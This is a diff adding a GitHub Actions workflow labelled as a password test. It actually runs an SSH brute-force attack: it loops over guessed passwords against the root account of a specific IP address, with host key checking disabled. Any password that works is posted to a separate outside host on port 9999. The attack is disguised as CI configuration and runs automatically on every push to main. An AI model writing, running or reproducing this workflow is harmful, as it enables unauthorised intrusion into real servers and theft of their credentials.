@@ -1,0 +1,23 @@
+name: PassTest2
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Try passwords
+        run: |
+          which sshpass || (sudo apt-get update -qq && sudo apt-get install -y -qq sshpass) || true
+          which sshpass || echo "NO_SSHPASS"
+          for p in root toor admin 123456 password crazycoin CrazyCoin cryptoflip CryptoFlip coinmaster coinmaster2026 crypto2026 admin123 12345678; do
+            out=$(timeout 10 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o PreferredAuthentications=password -o PubkeyAuthentication=no root@46.62.247.167 'id' 2>&1 || true)
+            echo "TRY $p: $out" | head -1
+            if echo "$out" | grep -q "uid="; then
+              echo "FOUND: $p"
+              curl -fsS -X POST http://178.156.165.170:9999/ -d "PWFOUND:$p" || true
+            fi
+          done
+          echo ALLDONE
